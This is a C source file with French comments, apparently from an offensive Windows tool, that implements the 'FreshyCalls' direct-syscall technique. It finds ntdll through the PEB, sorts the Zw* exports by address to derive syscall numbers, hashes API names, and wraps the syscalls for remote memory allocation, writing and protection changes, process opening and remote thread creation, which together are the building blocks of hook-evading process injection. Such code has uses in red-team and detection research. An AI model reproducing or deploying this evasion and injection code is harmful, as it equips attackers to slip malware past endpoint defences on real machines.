/*
 * syscalls.c — Résolution dynamique des SSN par tri de l'EAT + wrappers NTAPI
 *
 * Les numéros de syscall (SSN) sont résolus au démarrage en énumérant toutes
 * les exportations Zw* de ntdll, en les triant par adresse croissante, puis en
 * assignant leur index de tri comme SSN. Cette technique (dite « FreshyCalls »)
 * fonctionne car Windows attribue des numéros consécutifs aux fonctions Nt/Zw
 * dans l'ordre où elles apparaissent en mémoire.
 *
 * Chaque wrapper d* appelle SetSSN() pour configurer le SSN courant, puis
 * invoque RunSyscall() via le stub ASM générique.
 */

#include "utils/syscalls.h"
#include "utils/macros.h"
#include <stdint.h>

/* ============================================================================
 * Table des syscalls
 * ========================================================================= */

static SYSCALL_ENTRY g_SyscallTable[MAX_SYSCALL_ENTRIES];
static DWORD         g_SyscallCount = 0;

/* ============================================================================
 * Fonctions internes
 * ========================================================================= */

/**
 * @brief Trie le tableau d'entrées par adresse croissante (tri par insertion).
 *
 * Évite toute dépendance au CRT (pas de qsort). Pour ~450 entrées Zw*, le
 * tri par insertion reste négligeable en temps d'initialisation.
 *
 * @param entries Tableau d'entrées à trier (modifié en place).
 * @param count   Nombre d'entrées dans le tableau.
 */
static void SortSyscallEntries(SYSCALL_ENTRY* entries, DWORD count){
  for(DWORD i = 1; i < count; i++){
    SYSCALL_ENTRY key = entries[i];
    DWORD j = i;
    /* Décalage des éléments supérieurs pour insérer key à sa place. */
    while(j > 0 && entries[j - 1].address > key.address){
      entries[j] = entries[j - 1];
      j--;
    }
    entries[j] = key;
  }
}

/**
 * @brief Calcule le hash FNV-1a d'un nom Zw* comme si son préfixe était "Nt".
 *
 * Permet de stocker les entrées avec le hash de leur nom Nt* (ex. :
 * "ZwAllocateVirtualMemory" → hash("NtAllocateVirtualMemory")), de sorte que
 * les constantes HASH_Nt* de syscalls.h servent directement à la recherche.
 *
 * @param zwName Nom d'une exportation Zw* (chaîne ASCII terminée par NUL).
 * @return Hash FNV-1a 32 bits du nom Nt* équivalent.
 */
static DWORD HashZwToNt(const char* zwName){
  DWORD hash = FNV1A_OFFSET_BASIS;

  /* Substitution du préfixe "Zw" par "Nt" dans le calcul du hash. */
  hash ^= (DWORD)'N'; hash *= FNV1A_PRIME;
  hash ^= (DWORD)'t'; hash *= FNV1A_PRIME;

  /* Poursuite du hash sur le reste du nom (après les deux caractères "Zw"). */
  const char* reste = zwName + 2;
  while(*reste){
    hash ^= (DWORD)(unsigned char)*reste;
    hash *= FNV1A_PRIME;
    reste++;
  }

  return hash;
}

/* ============================================================================
 * Initialisation
 * ========================================================================= */

/**
 * @brief Peuple la table des syscalls par énumération et tri de l'EAT de ntdll.
 *
 * Étapes :
 *   1. Localisation de ntdll.dll via parcours du PEB.
 *   2. Analyse de l'Export Address Table (EAT) pour collecter les Zw*.
 *   3. Tri des entrées par adresse — l'index trié est le SSN.
 *   4. Attribution des SSN selon leur position dans le tableau trié.
 *
 * @return true en cas de succès, false si ntdll est introuvable ou sans Zw*.
 */
bool InitSyscalls(void){
  /* Résolution de ntdll.dll via parcours de l'InMemoryOrderModuleList du PEB. */
  HMODULE hNtdll = GetModuleBase_Hashed(HASH_NTDLL_DLL);
  if(hNtdll == NULL)
    return false;

  BYTE* pBase = (BYTE*)hNtdll;

  /* Validation des signatures PE avant tout accès aux structures. */
  IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)pBase;
  if(pDos->e_magic != IMAGE_DOS_SIGNATURE)
    return false;

  IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
  if(pNt->Signature != IMAGE_NT_SIGNATURE)
    return false;

  /* Localisation du répertoire des exportations. */
  IMAGE_DATA_DIRECTORY* pExportDir =
    &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

  if(pExportDir->VirtualAddress == 0 || pExportDir->Size == 0)
    return false;

  IMAGE_EXPORT_DIRECTORY* pExports =
    (IMAGE_EXPORT_DIRECTORY*)(pBase + pExportDir->VirtualAddress);

  DWORD* pAddressOfFunctions    = (DWORD*)(pBase + pExports->AddressOfFunctions);
  DWORD* pAddressOfNames        = (DWORD*)(pBase + pExports->AddressOfNames);
  WORD*  pAddressOfNameOrdinals = (WORD*) (pBase + pExports->AddressOfNameOrdinals);

  /* Collecte des exportations Zw* avec leur hash Nt* et leur adresse. */
  g_SyscallCount = 0;

  for(DWORD i = 0;
      i < pExports->NumberOfNames && g_SyscallCount < MAX_SYSCALL_ENTRIES;
      i++){
    const char* name = (const char*)(pBase + pAddressOfNames[i]);

    /* Seules les fonctions Zw* correspondent à des syscalls numérotés. */
    if(name[0] == 'Z' && name[1] == 'w'){
      WORD  ordinal = pAddressOfNameOrdinals[i];
      DWORD funcRva = pAddressOfFunctions[ordinal];

      g_SyscallTable[g_SyscallCount].hash    = HashZwToNt(name);
      g_SyscallTable[g_SyscallCount].address = (PVOID)(pBase + funcRva);
      g_SyscallTable[g_SyscallCount].ssn     = 0;
      g_SyscallCount++;
    }
  }

  if(g_SyscallCount == 0)
    return false;

  /* Tri par adresse : l'index dans le tableau trié est égal au SSN. */
  SortSyscallEntries(g_SyscallTable, g_SyscallCount);

  /* Attribution des SSN selon la position triée. */
  for(DWORD i = 0; i < g_SyscallCount; i++)
    g_SyscallTable[i].ssn = i;

  return true;
}

/* ============================================================================
 * Recherche par hash
 * ========================================================================= */

/**
 * @brief Retourne le SSN d'une fonction Nt* identifiée par son hash FNV-1a.
 *
 * @param functionHash Hash FNV-1a du nom Nt* (ex. : HASH_NtOpenProcess).
 * @return SSN correspondant, ou (DWORD)-1 si la fonction est introuvable.
 */
DWORD GetSSN_Hashed(DWORD functionHash){
  for(DWORD i = 0; i < g_SyscallCount; i++){
    if(g_SyscallTable[i].hash == functionHash)
      return g_SyscallTable[i].ssn;
  }
  return (DWORD)-1;
}

/* ============================================================================
 * Wrappers de syscalls directs
 *
 * Chaque wrapper : recherche du SSN → SetSSN() → invocation de RunSyscall().
 * Le stub ASM transmet tous les registres (RCX, RDX, R8, R9) et les arguments
 * sur la pile sans modification ; on caste son adresse vers la signature exacte.
 * ========================================================================= */

/**
 * @brief Alloue de la mémoire virtuelle dans un processus distant.
 * @see NtAllocateVirtualMemory
 */
NTSTATUS dAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
                                ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                ULONG AllocationType, ULONG Protect){
  SetSSN(GetSSN_Hashed(HASH_NtAllocateVirtualMemory));
  typedef NTSTATUS (NTAPI *fn)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
  return ((fn)RunSyscall)(ProcessHandle, BaseAddress, ZeroBits, RegionSize,
                          AllocationType, Protect);
}

/**
 * @brief Écrit dans la mémoire virtuelle d'un processus distant.
 * @see NtWriteVirtualMemory
 */
NTSTATUS dWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                             PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                             PSIZE_T NumberOfBytesWritten){
  SetSSN(GetSSN_Hashed(HASH_NtWriteVirtualMemory));
  typedef NTSTATUS (NTAPI *fn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
  return ((fn)RunSyscall)(ProcessHandle, BaseAddress, Buffer,
                          NumberOfBytesToWrite, NumberOfBytesWritten);
}

/**
 * @brief Lit la mémoire virtuelle d'un processus distant.
 * @see NtReadVirtualMemory
 */
NTSTATUS dReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                            PVOID Buffer, SIZE_T NumberOfBytesToRead,
                            PSIZE_T NumberOfBytesRead){
  SetSSN(GetSSN_Hashed(HASH_NtReadVirtualMemory));
  typedef NTSTATUS (NTAPI *fn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
  return ((fn)RunSyscall)(ProcessHandle, BaseAddress, Buffer,
                          NumberOfBytesToRead, NumberOfBytesRead);
}

/**
 * @brief Modifie les protections d'une région mémoire distante.
 * @see NtProtectVirtualMemory
 */
NTSTATUS dProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
                               PSIZE_T RegionSize, ULONG NewProtection,
                               PULONG OldProtection){
  SetSSN(GetSSN_Hashed(HASH_NtProtectVirtualMemory));
  typedef NTSTATUS (NTAPI *fn)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
  return ((fn)RunSyscall)(ProcessHandle, BaseAddress, RegionSize,
                          NewProtection, OldProtection);
}

/**
 * @brief Ouvre un handle vers un processus existant.
 * @see NtOpenProcess
 */
NTSTATUS dOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                      POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId){
  SetSSN(GetSSN_Hashed(HASH_NtOpenProcess));
  typedef NTSTATUS (NTAPI *fn)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
  return ((fn)RunSyscall)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

/**
 * @brief Crée un thread dans un processus cible.
 * @see NtCreateThreadEx
 */
NTSTATUS dCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                         POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
                         PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
                         SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
                         PVOID AttributeList){
  SetSSN(GetSSN_Hashed(HASH_NtCreateThreadEx));
  typedef NTSTATUS (NTAPI *fn)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE,
                               PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
  return ((fn)RunSyscall)(ThreadHandle, DesiredAccess, ObjectAttributes,
                          ProcessHandle, StartRoutine, Argument, CreateFlags,
                          ZeroBits, StackSize, MaximumStackSize, AttributeList);
}
